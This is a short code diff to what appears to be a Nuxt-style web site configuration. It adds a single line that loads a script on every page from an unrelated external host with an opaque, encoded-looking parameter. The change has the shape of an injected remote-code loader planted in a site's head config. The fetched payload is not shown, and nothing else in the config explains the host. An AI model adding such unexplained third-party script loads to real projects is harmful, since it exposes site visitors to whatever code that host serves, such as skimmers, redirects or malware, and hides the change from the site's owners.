@@ -52,6 +52,7 @@ const config: Configuration = {
         content: '113749536134548'
       }
     ],
+    script: [{ src: '//kitchen.juicer.cc/?color=ItzXKbVFUys=', async: true }],
     link: [
       { rel: 'icon', type: 'image/x-icon', href: '/favicon.ico' },
       { rel: 'apple-touch-icon', href: '/apple-touch-icon-precomposed.png' },
